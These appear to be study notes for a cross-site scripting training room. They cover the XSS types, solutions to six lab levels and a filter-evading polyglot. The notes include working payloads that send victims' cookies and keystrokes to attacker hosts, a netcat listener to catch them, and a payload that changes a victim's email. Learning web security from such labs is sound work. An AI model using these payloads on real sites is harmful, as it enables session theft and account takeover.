
# Intro to Cross-site Scripting (XSS)

## Overview
- **XSS** is an injection attack where malicious JavaScript is injected into a web application to be executed by other users.
- The **payload** is the JavaScript code to be executed, consisting of:
  - **Intention:** Desired action (e.g., alert, steal cookie)
  - **Modification:** Adjustments made for execution

## XSS Intentions and Payload Examples

### Proof of Concept
```html
<script>alert('XSS');</script>
```

### Session Stealing
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

### Business Logic Attack
```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## XSS Types

### Reflected XSS
- Reflected user input is included in web page output without validation.
- Test vectors:
  - URL parameters
  - File paths
  - HTTP headers (rare)
- **Impact:** Session hijacking, data leakage

### Stored XSS
- Malicious payload is stored in a backend database and shown to users.
- Test points:
  - Blog comments
  - Profile information
  - Form inputs (e.g., age field manipulation)

### DOM-Based XSS
- JavaScript in the browser processes attacker-controlled input (e.g., `window.location.hash`).
- **Impact:** Redirects, cookie theft
- Look for use of:
  - `eval()`
  - Direct DOM insertion

### Blind XSS
- Payload triggers in another user's view (e.g., staff portal).
- Requires callback (e.g., fetch to server).
- Tools: XSS Hunter Express

## Practical Labs

### Level 1
```html
<script>alert('THM');</script>
```

### Level 2
```html
"><script>alert('THM');</script>
```

### Level 3
```html
</textarea><script>alert('THM');</script>
```

### Level 4
```html
';alert('THM');// 
```

### Level 5 (bypass filter)
```html
<sscriptcript>alert('THM');</sscriptcript>
```

### Level 6 (attribute injection)
```html
/images/cat.jpg" onload="alert('THM');
```

## Polyglot Payload
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Blind XSS Practical Example

### Payload to Exfiltrate Cookies
```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>
```

### Netcat Listener
```bash
nc -nlvp 9001
```

### Base64 Decode Site
- https://www.base64decode.org/
